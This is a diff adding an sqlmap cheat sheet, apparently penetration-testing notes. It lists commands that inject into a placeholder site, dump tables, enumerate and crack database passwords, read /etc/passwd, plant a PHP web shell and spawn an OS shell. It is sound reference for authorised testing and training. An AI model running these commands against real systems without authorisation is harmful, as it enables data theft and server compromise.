@@ -1,0 +1,44 @@
+#sqlmap without user interaction
+sqlmap -u "http://domain.tld/page.ext?key=value" --batch
+#sqlmap with POST request
+sqlmap 'http://domain.tld/' --data 'key=value&key1=value1'
+#POST request specifying an injection point with an asterisk
+sqlmap 'http://domain.tld/' --data 'key=value*&key1=value1'
+#passing an HTTP request file to SQLMap
+sqlmap -r req.txt
+#specifying a cookie header
+sqlmap 'http://domain.tld'  --cookie='key=value'
+#specifying a PUT request
+sqlmap -u "http://domain.tld" --data='key=value' --method PUT
+#store traffic to an output file
+sqlmap -u "http://domain.tld/page.ext?key=value" --batch -t /tmp/traffic.txt
+#specifying a prefix or suffix
+sqlmap -u "http://domain.tld/?key=value" --prefix="%'))" --suffix="-- -"
+#specifying the level and risk
+sqlmap -u "http://domain.tld/?key=value" -v 3 --level=5 --risk=3
+#basic db enumeration
+sqlmap -u "http://domain.tld/?key=value" --banner --current-user --current-db --is-dba
+#table ennumeration
+sqlmap -u "http://domain.tld/?key=value" --tables -D <database>
+#table/row enumeration
+sqlmap -u "http://domain.tld/?key=value" --dump -T <table> -D <database> -C <column1>,<column2>
+#conditional enumeration
+sqlmap -u "http://domain.tld/?key=value" --dump -T <table> -D <database> --where="<column> LIKE 'f%'"
+#database schema enumeration
+sqlmap -u "http://domain.tld/?key=value" --schema
+#searching for data
+sqlmap -u "http://domain.tld/?key=value" --search -T <table>
+#password enumeration and cracking
+sqlmap -u "http://domain.tld/?key=value" --passwords --batch
+#anti-CSRF token bypass
+sqlmap -u "http://domain.tld/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+#list all tamper scripts
+sqlmap --list-tampers
+#check for DBA privileges
+sqlmap -u "http://domain.tld/page.ext?key=value" --is-dba
+#reading a local file
+sqlmap -u "http://domain.tld/?key=value" --file-read "/etc/passwd"
+#writing a file
+sqlmap -u "http://domain.tld/?key=value" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+#spawning an OS shell
+sqlmap -u "http://domain.tld/?key=value" --os-shell
